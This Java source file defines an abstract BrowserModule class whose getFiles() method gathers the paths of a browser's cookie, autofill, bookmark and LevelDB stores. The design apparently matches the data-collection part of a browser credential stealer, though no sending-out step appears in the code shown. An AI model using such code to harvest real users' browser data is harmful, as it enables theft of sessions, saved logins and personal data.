package application.modules;

import application.helpers.FileData;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

public abstract class BrowserModule {

    private String browser;

    public BrowserModule(String browser) {
        this.browser = browser;
    }

    public String getBrowser() {
        return browser;
    }

    public abstract String getBookmarks();

    public abstract String getCookie();

    public abstract String getAutoFill();

    public abstract String getLevelDB();

    public List<FileData> getFiles() {
        List<FileData> files = new ArrayList<>();

        files.add(new FileData(new File(getCookie()), "Cookies"));
        files.add(new FileData(new File(getAutoFill()), "AutoFill"));
        files.add(new FileData(new File(getBookmarks()), "Bookmarks"));
        files.add(new FileData(new File(getLevelDB()), "leveldb"));
        return files;
    }


}
